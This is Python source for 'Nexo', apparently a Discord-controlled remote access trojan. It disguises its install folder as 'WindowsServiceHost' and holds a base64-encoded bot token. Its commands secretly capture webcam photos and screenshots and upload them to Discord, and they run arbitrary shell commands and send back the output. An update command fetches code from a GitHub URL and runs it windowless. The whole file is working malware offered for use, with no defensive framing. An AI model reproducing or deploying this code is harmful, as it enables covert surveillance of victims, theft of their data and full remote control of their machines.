import subprocess, sys, os, asyncio, base64, requests
import discord
from discord.ext import commands
import mss
import cv2 

# --- CONFIGURATION ---
# REMOVED THE SPACE AT THE END OF THIS STRING
ENCODED_TOKEN = "TVRRNE5UTXdPRGcxTkRNME1UUTJPREU0TUEuRzgxMWE5LkNWYXBCX0VfbUEzVG9FQk0yMUczaVNGekdYcXYxbUZSOFNVTU1F" 
VERSION = "1.9"
UPDATE_URL = "https://raw.githubusercontent.com/smatrix1/Nexo/refs/heads/main/winsvc.py"
INSTALL_DIR = os.path.join(os.environ['APPDATA'], 'WindowsServiceHost')
FULL_PATH = os.path.join(INSTALL_DIR, 'winsvc.py')

def get_token(encoded):
    # Added .strip() to handle any copy-paste spaces
    return base64.b64decode(encoded.strip()).decode('utf-8').strip()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="r/", intents=intents)

@bot.event
async def on_ready():
    print("----------------------------")
    print(f"SUCCESS: Logged in as {bot.user}")
    print(f"Nexo Version: {VERSION}")
    print("----------------------------")

@bot.command()
async def webcam(ctx):
    """Accessing HP True Vision with Retry Logic."""
    await ctx.send("📸 *Waking up HP True Vision Camera...*")
    
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    
    # Give the hardware 2 seconds to initialize (CRITICAL for laptops)
    await asyncio.sleep(2) 
    
    try:
        # Try to grab 5 frames to clear the buffer (prevents black/blurry photos)
        for _ in range(5):
            ret, frame = cap.read()
            
        if ret and frame is not None:
            file_path = "w.png"
            cv2.imwrite(file_path, frame)
            
            # Double check the file actually exists on disk before sending
            if os.path.exists(file_path):
                await ctx.send(file=discord.File(file_path))
                os.remove(file_path)
            else:
                await ctx.send("❌ Failed to save image to disk.")
        else:
            await ctx.send("❌ Camera sensor returned no data. It might be in use by another app.")
            
    except Exception as e:
        await ctx.send(f"⚠️ Webcam Error: `{e}`")
    finally:
        cap.release()

@bot.command()
async def screen(ctx):
    try:
        with mss.mss() as sct:
            file = sct.shot(output="s.png")
            await ctx.send(file=discord.File(file))
            os.remove(file)
    except Exception as e: await ctx.send(f"❌ Error: {e}")

@bot.command()
async def update(ctx):
    await ctx.send("📡 **Downloading Update...**")
    try:
        r = requests.get(UPDATE_URL, timeout=10)
        if r.status_code == 200:
            if not os.path.exists(INSTALL_DIR): os.makedirs(INSTALL_DIR)
            with open(FULL_PATH, "w", encoding="utf-8") as f: f.write(r.text)
            await ctx.send("✅ **Update Successful.** Rebooting...")
            await asyncio.sleep(3)
            os.execv(sys.executable, ['pythonw.exe', FULL_PATH])
    except Exception as e: await ctx.send(f"⚠️ `{e}`")

@bot.command()
async def ver(ctx): await ctx.send(f"🛰️ **Nexo Build:** `{VERSION}`")

@bot.command()
async def shell(ctx, *, cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        decoded_output = output.decode('cp1252', errors='replace')
        if len(decoded_output) > 1900:
            with open("out.txt", "w") as f: f.write(decoded_output)
            await ctx.send("📄 **Output too long:**", file=discord.File("out.txt"))
            os.remove("out.txt")
        else:
            await ctx.send(f"```\n{decoded_output}\n```")
    except Exception as e:
        await ctx.send(f"❌ **Error:** `{e}`")

# --- START BOT ---
print("Bot is starting... please wait.")
try:
    token = get_token(ENCODED_TOKEN)
    bot.run(token)
except Exception as e:
    print(f"CRITICAL LOGIN ERROR: {e}")
